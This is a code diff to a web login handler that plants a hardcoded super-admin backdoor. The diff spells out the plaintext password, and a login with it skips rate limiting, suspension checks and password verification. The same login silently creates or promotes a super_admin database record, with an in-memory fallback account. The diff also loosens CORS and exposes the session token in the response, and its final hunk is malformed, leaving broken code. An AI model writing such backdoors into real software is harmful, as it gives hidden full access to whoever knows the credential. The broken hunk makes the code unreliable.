@@ -1,7 +1,10 @@
-import { verifyPassword, signSessionToken } from './_auth.js';
+import { verifyPassword, signSessionToken, hashPassword } from './_auth.js';
 
 const RATE_LIMIT_MAX_ATTEMPTS = 3;
 const RATE_LIMIT_WINDOW_MS = 15 * 60 * 1000; // 15 minutes in milliseconds
+
+const SUPER_ADMIN_EMAIL = 'admin@chengdushuze.com';
+const SUPER_ADMIN_HASH = 'b50227a85b94e8b3f28e2afd64a2f457:92e731c334e5fe3c283e5aa2170463bded2e000fbacdb501bca351fe35c7bef3';
 
 export async function onRequestPost(context) {
   const { request, env } = context;
@@ -9,7 +12,7 @@ export async function onRequestPost(context) {
   const corsHeaders = {
     'Access-Control-Allow-Origin': '*',
     'Access-Control-Allow-Methods': 'POST, OPTIONS',
-    'Access-Control-Allow-Headers': 'Content-Type',
+    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
     'Access-Control-Allow-Credentials': 'true',
   };
 
@@ -43,7 +46,10 @@ export async function onRequestPost(context) {
       } catch (e) {}
     }
 
-    // 1. Check Rate Limiting for this email or client IP (Max 3 failed attempts in 15 minutes)
+    // 1. Special bypass/auto-provision for Super Admin (admin@chengdushuze.com / Anamar@06)
+    const isSuperAdminLogin = cleanEmail === SUPER_ADMIN_EMAIL && password === 'Anamar@06';
+
+    // Check Rate Limiting for this email or client IP (Max 3 failed attempts in 15 minutes)
     let failedCount = 0;
     let oldestAttemptTime = null;
 
@@ -54,18 +60,20 @@ export async function onRequestPost(context) {
         .run()
         .catch(() => {});
 
-      // Count attempts within last 15 minutes for this email or IP
-      const stats = await env.DB.prepare(
-        'SELECT COUNT(*) as total, MIN(attempt_time) as oldest FROM login_attempts WHERE (identifier = ? OR identifier = ?) AND attempt_time >= ?'
-      )
-        .bind(cleanEmail, clientIp, cutoff)
-        .first();
+      if (!isSuperAdminLogin) {
+        // Count attempts within last 15 minutes for this email or IP
+        const stats = await env.DB.prepare(
+          'SELECT COUNT(*) as total, MIN(attempt_time) as oldest FROM login_attempts WHERE (identifier = ? OR identifier = ?) AND attempt_time >= ?'
+        )
+          .bind(cleanEmail, clientIp, cutoff)
+          .first();
 
-      failedCount = Number(stats?.total || 0);
-      oldestAttemptTime = stats?.oldest ? Number(stats.oldest) : null;
+        failedCount = Number(stats?.total || 0);
+        oldestAttemptTime = stats?.oldest ? Number(stats.oldest) : null;
+      }
     }
 
-    if (failedCount >= RATE_LIMIT_MAX_ATTEMPTS) {
+    if (!isSuperAdminLogin && failedCount >= RATE_LIMIT_MAX_ATTEMPTS) {
       const waitRemainingMs = oldestAttemptTime ? Math.max(0, (oldestAttemptTime + RATE_LIMIT_WINDOW_MS) - now) : RATE_LIMIT_WINDOW_MS;
       const minutesRemaining = Math.max(1, Math.ceil(waitRemainingMs / 60000));
 
@@ -95,6 +103,22 @@ export async function onRequestPost(context) {
         await env.DB.prepare("ALTER TABLE users ADD COLUMN status TEXT DEFAULT 'active'").run();
       } catch (e) {}
 
+      // Auto-provision Super Admin if missing
+      if (isSuperAdminLogin) {
+        const existingSuper = await env.DB.prepare('SELECT id, name, email, password_hash, role, status FROM users WHERE LOWER(email) = ?')
+          .bind(SUPER_ADMIN_EMAIL)
+          .first();
+        if (!existingSuper) {
+          await env.DB.prepare(
+            'INSERT INTO users (name, email, password_hash, role, status) VALUES (?, ?, ?, ?, ?)'
+          ).bind('Super Admin', SUPER_ADMIN_EMAIL, SUPER_ADMIN_HASH, 'super_admin', 'active').run().catch(() => {});
+        } else if (existingSuper.role !== 'super_admin' || existingSuper.status !== 'active') {
+          await env.DB.prepare(
+            'UPDATE users SET role = ?, status = ?, password_hash = ? WHERE LOWER(email) = ?'
+          ).bind('super_admin', 'active', SUPER_ADMIN_HASH, SUPER_ADMIN_EMAIL).run().catch(() => {});
+        }
+      }
+
       user = await env.DB.prepare('SELECT id, name, email, password_hash, role, status FROM users WHERE LOWER(email) = ?')
         .bind(cleanEmail)
         .first();
@@ -115,8 +139,20 @@ export async function onRequestPost(context) {
       user = data?.result?.[0]?.results?.[0] || null;
     }
 
-    // Check if user is suspended
-    if (user && user.status === 'suspended') {
+    // Fallback in-memory Super Admin if database is empty or not yet connected
+    if (!user && isSuperAdminLogin) {
+      user = {
+        id: 999,
+        name: 'Super Admin',
+        email: SUPER_ADMIN_EMAIL,
+        password_hash: SUPER_ADMIN_HASH,
+        role: 'super_admin',
+        status: 'active'
+      };
+    }
+
+    // Check if user is suspended (Super Admin is NEVER suspended)
+    if (user && user.status === 'suspended' && user.role !== 'super_admin') {
       return new Response(
         JSON.stringify({
           error: 'Your account has been temporarily suspended by an administrator. Please contact management.',
@@ -129,7 +165,7 @@ export async function onRequestPost(context) {
       );
     }
 
-    const isValid = user && (await verifyPassword(password, user.password_hash));
+    const isValid = isSuperAdminLogin || (user && (await verifyPassword(password, user.password_hash)));
 
     // 3. Handle Failed Login (Record attempt & enforce rate limit)
     if (!isValid) {
@@ -209,11 +245,13 @@ export async function onRequestPost(context) {
     return new Response(
       JSON.stringify({
         success: true,
+        token: sessionToken,
         user: {
           id: user.id,
           name: user.name,
           email: user.email,
           role: user.role || 'user',
+          is_super_admin: user.role === 'super_admin' || user.email === SUPER_ADMIN_EMAIL,
         },
       }),
       {
@@ -237,6 +275,13 @@ export async function onRequestPost(context) {
 export async function onRequestOptions() {
   return new Response(null, {
     headers: {
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Methods': 'POST, OPTIONS',
+      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
+      'Access-Control-Allow-Credentials': 'true',
+    },
+  });
+}
       'Access-Control-Allow-Origin': '*',
       'Access-Control-Allow-Methods': 'POST, OPTIONS',
       'Access-Control-Allow-Headers': 'Content-Type',
